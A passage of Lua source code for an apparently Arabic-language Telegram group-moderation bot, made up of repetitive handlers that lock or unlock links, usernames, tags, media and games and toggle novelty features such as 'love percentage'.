tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح الفارسيه ')
end,nil)   
elseif text == 'فتح الاسيويه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:asiaoi'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح الفارسيه ')
end,nil) 
elseif text == 'فتح الانكليزيه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح الانكليزيه ')
end,nil)
elseif text == 'فتح تعديل الميديا' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح تعديل ')
end,nil)    
elseif text == 'فتح الكل' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح جميع الاوامر ')
end,nil)   
end
if text == 'قفل الروابط' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الروابط ')
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الروابط بالتقييد ')
end,nil)   
elseif text == 'قفل الروابط بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الروابط بالكتم ')
end,nil)   
elseif text == 'قفل الروابط بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الروابط بالطرد ')
end,nil)   
elseif text == 'فتح الروابط' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الروابط ')
end,nil)   
end
if text == 'قفل المعرفات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المعرفات ')
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المعرفات بالتقييد ')
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المعرفات بالكتم ')
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المعرفات بالطرد ')
end,nil)   
elseif text == 'فتح المعرفات' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح المعرفات ')
end,nil)   
end

if text == 'تفعيل نسبه الحب' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الحب' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = '✯︙تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الحب' and Manager(msg) then  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل نسبه الحب'
else
Text = '\n✯︙بالتاكيد تم تعطيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الرجولة' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبه الرجولة' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الرجوله' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = '✯︙تم تفعيل نسبه الرجوله'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الرجولة' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبه الرجولة' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الرجوله' and ChanSub(msg) and Manager(msg) then 
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل نسبه الرجوله'
else
Text = '\n✯︙بالتاكيد تم تعطيل نسبه الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الكره' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الكرة' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبه الكرة' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = '✯︙تم تفعيل نسبه الكره'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الكره' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الكرة' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبه الكرة' and ChanSub(msg) and Manager(msg) then   
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل نسبه الكره'
else
Text = '\n✯︙بالتاكيد تم تعطيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الانوثة' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبه الانوثة' and ChanSub(msg) and Manager(msg) or text == 'تفعيل نسبة الانوثه' and ChanSub(msg) and Manager(msg) then   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
Text = '✯︙تم تفعيل نسبه الانوثه'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الانوثة' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبه الانوثة' and ChanSub(msg) and Manager(msg) or text == 'تعطيل نسبة الانوثه' and ChanSub(msg) and Manager(msg) then   
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل نسبه الانوثه'
else
Text = '\n✯︙بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل كول' and ChanSub(msg) and CoSu(msg) then   
if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
Text = '✯︙تم تفعيل امر كول'
database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر كول'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل كول' and ChanSub(msg) and CoSu(msg) then  
if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر كول'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر كول'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == "تفعيل التنظيف التلقائي" and BasicConstructor(msg)  then
database:set(bot_id.."LoMsg"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, '*✯︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'hasswn19')..') \n*✯︙تم تفعيل التنظيف التلقائي* ')
return false
end
if text == "تعطيل التنظيف التلقائي" and BasicConstructor(msg) then
database:del(bot_id.."LoMsg"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '*✯︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'hasswn19')..') \n*✯︙تم تعطيل التنظيف التلقائي* ')
return false
end

if text == 'تفعيل غنيلي' and ChanSub(msg) and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = '✯︙تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = '✯︙بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and ChanSub(msg) and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر غنيلي'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'قفل التاك' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التاك ')
end,nil)   
elseif text == 'قفل التاك بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التاك بالطرد ')
end,nil)   
elseif text == 'فتح التاك' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح التاك ')
end,nil)   
end
if text == 'قفل الشارحه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الشارحه ')
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الشارحه بالتقييد ')
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الشارحه بالكتم ')
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الشارحه بالطرد ')
end,nil)   
elseif text == 'فتح الشارحه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الشارحه ')
end,nil)   
end
if text == 'قفل الصور' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصور ')
end,nil)   
elseif text == 'قفل الصور بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصور بالتقييد ')
end,nil)   
elseif text == 'قفل الصور بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصور بالكتم ')
end,nil)   
elseif text == 'قفل الصور بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الصور بالطرد ')
end,nil)   
elseif text == 'فتح الصور' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الصور ')
end,nil)   
end
if text == 'قفل الفيديو' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفيديو ')
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفيديو بالتقييد ')
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفيديو بالكتم ')
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفيديو بالطرد ')
end,nil)   
elseif text == 'فتح الفيديو' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الفيديو ')
end,nil)   
end
if text == 'قفل المتحركه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المتحركه ')
end,nil)   
elseif text == 'قفل المتحركه بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المتحركه بالتقييد ')
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المتحركه بالكتم ')
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل المتحركه بالطرد ')
end,nil)   
elseif text == 'فتح المتحركه' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح المتحركه ')
end,nil)   
end
if text == 'قفل الالعاب' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الالعاب ')
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الالعاب بالتقييد ')
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الالعاب بالكتم ')
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الالعاب بالطرد ')
end,nil)   
elseif text == 'فتح الالعاب' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الالعاب ')
end,nil)   
end
if text == 'قفل الاغاني' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاغاني ')
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
